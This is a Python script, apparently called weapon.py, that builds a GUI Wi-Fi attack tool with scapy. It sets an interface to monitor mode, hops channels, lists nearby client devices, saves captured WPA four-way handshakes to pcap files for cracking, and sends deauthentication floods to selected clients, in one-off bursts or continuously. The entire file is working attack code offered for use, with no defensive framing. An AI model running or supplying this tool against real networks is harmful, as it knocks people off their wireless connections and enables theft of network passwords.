import os, sys, time, threading
from scapy.all import *
import tkinter as tk
from tkinter import messagebox

class WiFiWeapon:
    def __init__(self, iface):
        self.iface = iface
        self.clients = {}  # {MAC: {"BSSID": b, "SSID": s, "CH": c}}
        self.persistent_targets = set()
        self.handshakes = {} # {BSSID: [packets]}
        self.current_channel = 1

        self.prepare_hardware()
        self.start_channel_hoppers()

        # UI Setup
        self.root = tk.Tk()
        self.root.title("Surgical Wi-Fi Logic Controller")
        self.root.geometry("600x450")

        self.label = tk.Label(self.root, text="Select Target(s) to Kick", font=('Arial', 12, 'bold'))
        self.label.pack(pady=5)

        self.listbox = tk.Listbox(self.root, selectmode='multiple', width=80, height=15, bg="#1a1a1a", fg="#00ff00")
        self.listbox.pack(padx=10, pady=10)

        self.btn_frame = tk.Frame(self.root)
        self.btn_frame.pack(pady=5)

        tk.Button(self.btn_frame, text="Impulse Kick (Selected)", command=self.impulse_kick, bg="orange").pack(side="left", padx=10)
        tk.Button(self.btn_frame, text="Toggle Persistent", command=self.toggle_persistent, bg="red", fg="white").pack(side="left", padx=10)

        # Background Engines
        threading.Thread(target=self.discovery_engine, daemon=True).start()
        threading.Thread(target=self.attack_engine, daemon=True).start()

    def prepare_hardware(self):
        print("[*] Initializing Monitor Mode...")
        os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def channel_hopper(self, delay=0.5, offset=0):
        channels = list(range(1, 14)) + list(range(36, 165, 4))  # 2.4GHz + 5GHz common channels
        idx = offset
        while True:
            ch = channels[idx % len(channels)]
            os.system(f"iw dev {self.iface} set channel {ch}")
            self.current_channel = ch
            time.sleep(delay)
            idx += 1

    def start_channel_hoppers(self):
        # Three staggered hoppers, all at 0.5s
        threading.Thread(target=self.channel_hopper, args=(0.5, 0), daemon=True).start()
        threading.Thread(target=self.channel_hopper, args=(0.5, 5), daemon=True).start()
        threading.Thread(target=self.channel_hopper, args=(0.5, 10), daemon=True).start()

    def discovery_engine(self):
        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                if dot11.type == 2:  # Data frames
                    client = dot11.addr2
                    bssid = dot11.addr3
                    if bssid and client and client != bssid and client != "ff:ff:ff:ff:ff:ff":
                        if client not in self.clients:
                            self.clients[client] = {"BSSID": bssid, "CH": self.current_channel}
                            self.root.after(0, self.refresh_ui)

                if pkt.haslayer(EAPOL):
                    bssid = dot11.addr3
                    if bssid not in self.handshakes:
                        self.handshakes[bssid] = []
                    self.handshakes[bssid].append(pkt)
                    if len(self.handshakes[bssid]) >= 4:
                        wrpcap(f"HS_{bssid.replace(':','')}.pcap", self.handshakes[bssid])
                        print(f"\n[!!!] HANDSHAKE CAPTURED: {bssid}")

        sniff(iface=self.iface, prn=packet_handler, store=0)

    def attack_engine(self):
        while True:
            targets = list(self.persistent_targets)
            for client_mac in targets:
                data = self.clients.get(client_mac)
                if data:
                    bssid = data["BSSID"]
                    p1 = RadioTap()/Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    p2 = RadioTap()/Dot11(addr1=bssid, addr2=client_mac, addr3=bssid)/Dot11Deauth(reason=7)
                    sendp([p1, p2], count=5, inter=0.01, verbose=False)
            time.sleep(1)

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, data in self.clients.items():
            status = "[KICKING]" if mac in self.persistent_targets else "[IDLE]"
            self.listbox.insert(tk.END, f"{status} CLIENT: {mac} | ROUTER: {data['BSSID']} | CH: {data['CH']}")

    def impulse_kick(self):
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            threading.Thread(target=self.burst_deauth, args=(mac,)).start()

    def burst_deauth(self, mac):
        data = self.clients.get(mac)
        p = RadioTap()/Dot11(addr1=mac, addr2=data['BSSID'], addr3=data['BSSID'])/Dot11Deauth(reason=7)
        sendp(p, count=100, inter=0.01, verbose=False)

    def toggle_persistent(self):
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            if mac in self.persistent_targets:
                self.persistent_targets.remove(mac)
            else:
                self.persistent_targets.add(mac)
        self.refresh_ui()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 weapon.py [interface]")
    else:
        app = WiFiWeapon(sys.argv[1])
        app.root.mainloop()
